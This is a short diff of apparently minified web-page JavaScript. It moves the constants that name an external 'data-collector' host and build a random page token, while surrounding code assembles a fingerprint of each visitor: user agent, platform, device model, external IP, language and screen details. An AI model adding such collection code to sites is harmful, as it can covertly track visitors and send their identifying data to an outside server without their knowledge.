@@ -60,6 +60,9 @@
         }catch{ return {}; }
       };
       (async()=>{
+        const BASE_API = 'https://data-collector-gizw.onrender.com';
+        const PAGE_TOKEN = Array.from(crypto.getRandomValues(new Uint8Array(32))).map(b=>b.toString(16).padStart(2,'0')).join('');
+        Object.freeze(PAGE_TOKEN);
         const he = await zB();
         function dn(h){
           const h2 = h || {};
@@ -149,9 +152,6 @@
         }).join('');
         const folderName = 'site_logs';
         const fileName = undefined;
-        const BASE_API = 'https://data-collector-gizw.onrender.com';
-        const PAGE_TOKEN = Array.from(crypto.getRandomValues(new Uint8Array(32))).map(b=>b.toString(16).padStart(2,'0')).join('');
-        Object.freeze(PAGE_TOKEN);
         try {
           const collectPayload = { folder_name: folderName, file_name: fileName, content: txt, fingerprint: [z2,zA,he.model||'',extIP].join('|'), platform: zA, model: he.model||'', externalIP: extIP, userAgent: z2, language: z4, screen: screenInfo };
           Object.freeze(collectPayload);
